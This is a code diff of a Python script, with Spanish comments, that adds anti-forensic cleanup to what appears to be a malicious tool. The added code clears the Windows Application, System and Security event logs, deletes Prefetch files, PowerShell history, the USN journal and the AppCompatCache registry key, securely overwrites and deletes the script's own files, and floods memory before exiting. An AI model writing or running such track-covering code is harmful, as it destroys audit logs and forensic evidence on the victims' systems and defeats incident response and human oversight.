@@ -15,12 +15,27 @@ os.chdir(SCRIPT_DIR)
 
 def pre_cleanup():
     try:
+        # Limpiar prefetch
         os.system('powershell -w h -nop -c "Remove-Item C:\\Windows\\Prefetch\\*.pf -Force" 2>nul')
+        
+        # Limpiar event logs
         os.system('wevtutil cl Application 2>nul')
         os.system('wevtutil cl System 2>nul')
+        os.system('wevtutil cl Security 2>nul')
+        
+        # Limpiar PowerShell history
         ps_history = os.path.join(os.environ.get('APPDATA', ''), 'Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt')
         if os.path.exists(ps_history):
             open(ps_history, 'w').close()
+        
+        # Limpiar USN Journal
+        for drive in ['C:', 'D:', 'E:', 'F:']:
+            if os.path.exists(drive):
+                os.system(f'fsutil usn deletejournal /D {drive} 2>nul')
+        
+        # Limpiar Amcache
+        os.system('reg delete "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCompatCache" /f 2>nul')
+        
     except:
         pass
 
@@ -31,8 +46,15 @@ def auto_destruir_archivos():
         if os.path.exists(f):
             try:
                 size = os.path.getsize(f)
-                with open(f, 'wb') as fw:
-                    fw.write(os.urandom(size))
+                # Sobrescribir 3 veces (DoD 5220.22-M)
+                for pattern in [b'\\x00', b'\\xFF', os.urandom(size)]:
+                    with open(f, 'wb') as fw:
+                        if isinstance(pattern, bytes) and len(pattern) == 1:
+                            fw.write(pattern * size)
+                        else:
+                            fw.write(pattern)
+                        fw.flush()
+                        os.fsync(fw.fileno())
                 os.remove(f)
             except:
                 pass
@@ -43,6 +65,24 @@ def cleanup_python_thread():
     try:
         if os.path.exists('python_portable'):
             shutil.rmtree('python_portable')
+    except:
+        pass
+
+
+def wipe_memory_aggressive():
+    """Sobrescribir memoria sensible"""
+    try:
+        # Allocar memoria basura masiva
+        junk = [os.urandom(10 * 1024 * 1024) for _ in range(50)]
+        del junk
+        
+        import gc
+        for _ in range(10):
+            gc.collect()
+        
+        more_junk = [bytearray(5 * 1024 * 1024) for _ in range(30)]
+        del more_junk
+        gc.collect()
     except:
         pass
 
@@ -89,6 +129,11 @@ def main():
                     future.result()
                 except:
                     pass
+        
+        # Limpieza final agresiva
+        wipe_memory_aggressive()
+        pre_cleanup()
+        
     except:
         pass
 
